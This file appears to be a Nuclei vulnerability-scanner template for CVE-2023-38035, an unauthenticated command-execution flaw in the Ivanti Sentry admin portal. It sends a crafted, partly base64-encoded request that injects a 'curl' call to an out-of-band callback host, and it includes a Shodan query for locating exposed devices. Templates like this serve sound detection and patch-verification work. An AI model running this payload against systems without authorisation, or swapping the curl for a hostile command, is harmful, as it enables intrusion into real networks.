id: CVE-2023-38035

info:
  name: Ivanti Sentry - Authentication Bypass
  author: DhiyaneshDk,iamnoooob,rootxharsh
  severity: critical
  description: |
    A security vulnerability in MICS Admin Portal in Ivanti MobileIron Sentry versions 9.18.0 and below, which may allow an attacker to bypass authentication controls on the administrative interface due to an insufficiently restrictive Apache HTTPD configuration.
  reference:
    - https://forums.ivanti.com/s/article/CVE-2023-38035-API-Authentication-Bypass-on-Sentry-Administrator-Interface
    - https://www.horizon3.ai/ivanti-sentry-authentication-bypass-cve-2023-38035-deep-dive/
    - https://github.com/horizon3ai/CVE-2023-38035
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38035
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-38035
    epss-score: 0.01575
  metadata:
    max-request: 1
    shodan-query: 'html:"Note: Requires a local Sentry administrative user"'
    verified: true
  tags: cve,cve2023,ivanti,mobileiron,sentry,kev,rce,auth-bypass,oast

variables:
  oast: "{{interactsh-url}}/?"
  padstr: "{{randstr}}"

http:
  - raw:
      - |
        POST /mics/services/MICSLogService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {{base64_decode('YwEAbQAYdXBsb2FkRmlsZVVzaW5nRmlsZUlucHV0TVMAB2NvbW1hbmRTAEw=')}}curl {{padding(oast,padstr,71)}}{{base64_decode('UwAGaXNSb290VHpOeg==')}}

    matchers:
      - type: dsl
        dsl:
          - contains(body, 'isRunningTzz')
          - contains(interactsh_protocol, 'dns')
          - status_code == 200
        condition: and